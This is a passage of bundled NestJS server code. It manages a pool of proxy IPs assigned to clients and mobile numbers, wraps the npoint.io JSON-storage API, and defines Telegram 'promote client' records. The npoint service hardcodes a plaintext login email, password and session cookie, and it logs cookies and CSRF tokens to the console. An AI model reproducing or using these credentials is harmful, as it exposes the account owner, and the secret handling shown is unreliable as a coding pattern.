            throw new common_1.BadRequestException('No proxy IPs provided for bulk creation');
        }
        this.logger.debug(`Bulk creating ${proxyIps.length} proxy IPs`);
        let created = 0;
        let failed = 0;
        const errors = [];
        const batchSize = 10;
        for (let i = 0; i < proxyIps.length; i += batchSize) {
            const batch = proxyIps.slice(i, i + batchSize);
            for (const ipDto of batch) {
                try {
                    if (!ipDto.ipAddress || !ipDto.port) {
                        failed++;
                        errors.push(`Invalid IP data: missing address or port`);
                        continue;
                    }
                    await this.createProxyIp(ipDto);
                    created++;
                }
                catch (error) {
                    failed++;
                    errors.push(`${ipDto.ipAddress}:${ipDto.port} - ${error.message}`);
                }
            }
        }
        this.logger.log(`Bulk creation completed: ${created} created, ${failed} failed`);
        return { created, failed, errors };
    }
    async findAllProxyIps() {
        return this.proxyIpModel.find().lean();
    }
    async getAvailableProxyIps() {
        return this.proxyIpModel.find({
            status: 'active',
            isAssigned: false
        }).lean();
    }
    async updateProxyIp(ipAddress, port, updateDto) {
        this.logger.debug(`Updating proxy IP: ${ipAddress}:${port}`);
        const updatedIp = await this.proxyIpModel.findOneAndUpdate({ ipAddress, port }, { $set: updateDto }, { new: true }).lean();
        if (!updatedIp) {
            throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
        }
        this.logger.log(`Updated proxy IP: ${ipAddress}:${port}`);
        return updatedIp;
    }
    async deleteProxyIp(ipAddress, port) {
        this.logger.debug(`Deleting proxy IP: ${ipAddress}:${port}`);
        const result = await this.proxyIpModel.deleteOne({ ipAddress, port });
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
        }
        this.logger.log(`Deleted proxy IP: ${ipAddress}:${port}`);
    }
    async getStats() {
        try {
            const [total, available, assigned, inactive] = await Promise.all([
                this.proxyIpModel.countDocuments(),
                this.proxyIpModel.countDocuments({ status: 'active', isAssigned: false }),
                this.proxyIpModel.countDocuments({ isAssigned: true }),
                this.proxyIpModel.countDocuments({ status: 'inactive' })
            ]);
            return {
                total,
                available,
                assigned,
                inactive
            };
        }
        catch (error) {
            this.logger.error(`Error getting statistics: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get statistics: ${error.message}`);
        }
    }
    async findProxyIpById(ipAddress, port) {
        if (!ipAddress || !port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        try {
            const proxyIp = await this.proxyIpModel.findOne({ ipAddress, port }).lean();
            if (!proxyIp) {
                throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
            }
            return proxyIp;
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException) {
                throw error;
            }
            this.logger.error(`Error finding proxy IP ${ipAddress}:${port}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to find proxy IP: ${error.message}`);
        }
    }
    async getClientAssignedIps(clientId) {
        if (!clientId || clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        try {
            return this.proxyIpModel.find({
                assignedToClient: clientId.trim(),
                isAssigned: true
            }).lean();
        }
        catch (error) {
            this.logger.error(`Error getting assigned IPs for client ${clientId}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get assigned IPs: ${error.message}`);
        }
    }
    async isIpAvailable(ipAddress, port) {
        if (!ipAddress || !port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        try {
            const ip = await this.proxyIpModel.findOne({
                ipAddress,
                port,
                status: 'active',
                isAssigned: false
            }).lean();
            return ip !== null;
        }
        catch (error) {
            this.logger.error(`Error checking IP availability ${ipAddress}:${port}: ${error.message}`);
            return false;
        }
    }
    async getAvailableIpCount() {
        try {
            return this.proxyIpModel.countDocuments({
                status: 'active',
                isAssigned: false
            });
        }
        catch (error) {
            this.logger.error(`Error getting available IP count: ${error.message}`);
            return 0;
        }
    }
    async healthCheck() {
        try {
            const stats = await this.getStats();
            const issues = [];
            const utilizationRate = stats.total > 0 ? (stats.assigned / stats.total) * 100 : 0;
            let status = 'healthy';
            if (stats.available === 0) {
                status = 'critical';
                issues.push('No available IPs in pool');
            }
            else if (stats.available < 5) {
                status = 'warning';
                issues.push('Low IP availability (less than 5 IPs available)');
            }
            if (utilizationRate > 90) {
                status = utilizationRate > 95 ? 'critical' : 'warning';
                issues.push(`High utilization rate: ${utilizationRate.toFixed(1)}%`);
            }
            if (stats.inactive > stats.total * 0.2) {
                status = 'warning';
                issues.push('High number of inactive IPs');
            }
            return {
                status,
                availableIps: stats.available,
                totalActiveIps: stats.total - stats.inactive,
                utilizationRate: parseFloat(utilizationRate.toFixed(1)),
                issues
            };
        }
        catch (error) {
            this.logger.error(`Error during health check: ${error.message}`);
            return {
                status: 'critical',
                availableIps: 0,
                totalActiveIps: 0,
                utilizationRate: 0,
                issues: ['Health check failed']
            };
        }
    }
};
exports.IpManagementService = IpManagementService;
exports.IpManagementService = IpManagementService = IpManagementService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(proxy_ip_schema_1.ProxyIp.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], IpManagementService);


/***/ }),

/***/ "./src/components/ip-management/schemas/proxy-ip.schema.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/schemas/proxy-ip.schema.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ProxyIpSchema = exports.ProxyIp = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let ProxyIp = class ProxyIp {
};
exports.ProxyIp = ProxyIp;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100', description: 'IP address of the proxy' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ProxyIp.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 8080, description: 'Port number of the proxy' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], ProxyIp.prototype, "port", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'http', description: 'Protocol type (http, https, socks5)', enum: ['http', 'https', 'socks5'] }),
    (0, mongoose_1.Prop)({ required: true, enum: ['http', 'https', 'socks5'] }),
    __metadata("design:type", String)
], ProxyIp.prototype, "protocol", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'username', description: 'Username for proxy authentication' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'password', description: 'Password for proxy authentication' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'] }),
    (0, mongoose_1.Prop)({ required: true, default: 'active', enum: ['active', 'inactive'] }),
    __metadata("design:type", String)
], ProxyIp.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Whether this IP is currently assigned to a mobile number' }),
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], ProxyIp.prototype, "isAssigned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this IP' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "assignedToClient", void 0);
exports.ProxyIp = ProxyIp = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'proxy_ips',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ProxyIp);
exports.ProxyIpSchema = mongoose_1.SchemaFactory.createForClass(ProxyIp);
exports.ProxyIpSchema.index({ ipAddress: 1, port: 1 }, { unique: true });
exports.ProxyIpSchema.index({ status: 1, isAssigned: 1 });
exports.ProxyIpSchema.index({ assignedToClient: 1 });


/***/ }),

/***/ "./src/components/n-point/index.ts":
/*!*****************************************!*\
  !*** ./src/components/n-point/index.ts ***!
  \*****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./npoint.module */ "./src/components/n-point/npoint.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts"), exports);


/***/ }),

/***/ "./src/components/n-point/npoint.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/n-point/npoint.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let NpointController = class NpointController {
    constructor(npointService) {
        this.npointService = npointService;
    }
    async fetchDocument(id) {
        try {
            return await this.npointService.fetchDocument(id);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async postDocument(document) {
        try {
            return await this.npointService.postDocument(document);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async fetchAllDocuments() {
        try {
            return await this.npointService.fetchAllDocuments();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateDocument(id, updatedDocument) {
        try {
            return await this.npointService.updateDocument(id, updatedDocument);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.NpointController = NpointController;
__decorate([
    (0, common_1.Get)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to fetch' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchDocument", null);
__decorate([
    (0, common_1.Post)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Post a new document' }),
    (0, swagger_1.ApiBody)({
        description: 'The document to post',
        schema: {
            example: {
                title: 'My Document',
                content: 'This is the content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Document posted successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "postDocument", null);
__decorate([
    (0, common_1.Get)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch all documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'List of all documents fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchAllDocuments", null);
__decorate([
    (0, common_1.Put)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to update' }),
    (0, swagger_1.ApiBody)({
        description: 'The updated document',
        schema: {
            example: {
                title: 'Updated Document',
                content: 'This is the updated content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document updated successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "updateDocument", null);
exports.NpointController = NpointController = __decorate([
    (0, swagger_1.ApiTags)('NPoint API'),
    (0, common_1.Controller)('npoint'),
    __metadata("design:paramtypes", [npoint_service_1.NpointService])
], NpointController);


/***/ }),

/***/ "./src/components/n-point/npoint.module.ts":
/*!*************************************************!*\
  !*** ./src/components/n-point/npoint.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const npoint_controller_1 = __webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let NpointModule = class NpointModule {
};
exports.NpointModule = NpointModule;
exports.NpointModule = NpointModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
        ],
        controllers: [npoint_controller_1.NpointController],
        providers: [npoint_service_1.NpointService],
        exports: [npoint_service_1.NpointService]
    })
], NpointModule);


/***/ }),

/***/ "./src/components/n-point/npoint.service.ts":
/*!**************************************************!*\
  !*** ./src/components/n-point/npoint.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var NpointService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let NpointService = NpointService_1 = class NpointService {
    constructor() {
        this.logger = new utils_1.Logger(NpointService_1.name);
        this.csrfToken = null;
        this.cookie = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';
        this.baseUrl = 'https://www.npoint.io';
        this.signInUrl = 'https://www.npoint.io/users/sign_in';
    }
    async fetchCsrfToken() {
        this.logger.debug('Fetching CSRF token...');
        try {
            const data = JSON.stringify({
                "user": {
                    "email": "dodieajt@gmail.com",
                    "password": "Ajtdmwajt1@"
                }
            });
            const config = {
                method: 'post',
                maxBodyLength: Infinity,
                url: this.signInUrl,
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': this.cookie
                },
                data: data
            };
            const response = await axios_1.default.request(config);
            console.log("Cookie:", response.headers['set-cookie'][0]);
            this.cookie = response.headers['set-cookie'][0];
            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);
            if (!this.csrfToken) {
                throw new Error('CSRF token not found in the sign-in response.');
            }
            this.logger.debug('CSRF token fetched successfully.');
            return this.csrfToken;
        }
        catch (error) {
            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);
            throw new Error(`Failed to fetch CSRF token: ${error.message}`);
        }
    }
    async ensureCsrfToken() {
        if (!this.csrfToken) {
            await this.fetchCsrfToken();
        }
    }
    async fetchDocument(documentId) {
        this.logger.debug(`Fetching document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents/${documentId}`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to fetch document: ${error.message}`);
        }
    }
    async postDocument(document) {
        this.logger.debug('Posting a new document...');
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.post(`${this.baseUrl}/documents`, { "generate_contents": true }, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);
            await this.updateDocument(response.data.token, document);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to post document: ${error.message}`);
            throw new Error(`Failed to post document: ${error.message}`);
        }
    }
    async updateDocument(documentId, updatedDocument) {
        this.logger.debug(`Updating document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        const body = {
            "contents": JSON.stringify(updatedDocument),
            "original_contents": JSON.stringify(updatedDocument),
            "schema": null,
            "original_schema": ""
        };
        try {
            const response = await axios_1.default.put(`${this.baseUrl}/documents/${documentId}`, body, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);
            console.log(response.data.contents);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to update document: ${error.message}`);
        }
    }
    async fetchAllDocuments() {
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            return response.data;
        }
        catch (error) {
            throw new Error(`Failed to fetch all documents: ${error.message}`);
        }
    }
    async fetchCsrfTokenFromHtml(data) {
        try {
            const csrfTokenMatch = data.match(/<meta name="csrf-token" content="([^"]+)"/);
            if (!csrfTokenMatch || !csrfTokenMatch[1]) {
                throw new Error('CSRF token not found in the HTML response.');
            }
            const csrfToken = csrfTokenMatch[1];
            console.log('CSRF Token:', csrfToken);
            return csrfToken;
        }
        catch (error) {
            console.error('Error fetching CSRF token:', error);
        }
    }
};
exports.NpointService = NpointService;
exports.NpointService = NpointService = NpointService_1 = __decorate([
    (0, common_1.Injectable)()
], NpointService);


/***/ }),

/***/ "./src/components/promote-clients/dto/create-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/create-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreatePromoteClientDto {
}
exports.CreatePromoteClientDto = CreatePromoteClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'lastActive identifier',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreatePromoteClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Client ID this promote mobile belongs to',
        example: 'client123',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status of the promote client',
        example: 'active',
        default: 'active',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status message for the promote client',
        example: 'Account is functioning properly',
        default: 'Account is functioning properly',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Last used timestamp for the promote client',
        example: '2023-06-22T10:30:00.000Z',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", Date)
], CreatePromoteClientDto.prototype, "lastUsed", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/index.ts":
/*!*****************************************************!*\
  !*** ./src/components/promote-clients/dto/index.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/dto/search-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/search-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchPromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchPromoteClientDto {
}
exports.SearchPromoteClientDto = SearchPromoteClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the promoteClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchPromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/update-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/update-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
